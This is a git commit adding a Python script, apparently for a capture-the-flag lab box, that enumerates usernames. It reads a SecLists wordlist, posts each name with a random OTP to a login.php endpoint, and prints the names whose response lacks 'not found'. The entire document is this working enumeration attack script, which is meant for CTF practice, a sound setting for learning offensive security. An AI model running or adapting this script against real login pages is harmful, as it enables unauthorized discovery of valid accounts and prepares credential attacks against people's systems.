fcb76dff74e539a138121a83766a6f78dc3768e2
kmahyyg <16604643+kmahyyg@users.noreply.github.com>
2019-08-25 17:05:22 +0800

    add ctf box bruteforce name

---
+++ boxctf_brute_usrname.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python3
+# -*- encoding:utf-8 -*-
+
+import random
+import requests
+
+dictfile = '/usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt'
+
+host = '10.10.10.122'
+endp = '/login.php'
+finaluri = 'http://' + host + endp
+
+postparam = {"inputUsername": None, "inputOTP": None}
+
+f = open(dictfile, 'r')
+
+usrname = f.readline().strip()
+while usrname != '':
+    postparam["inputUsername"] = usrname
+    postparam["inputOTP"] = str(random.randint(10000000, 99999999))
+    r = requests.post(finaluri, json=postparam)
+    if 'not found' in r.text.lower():
+        pass
+    else:
+        print(postparam["inputUsername"])
+    usrname = f.readline().strip()
+
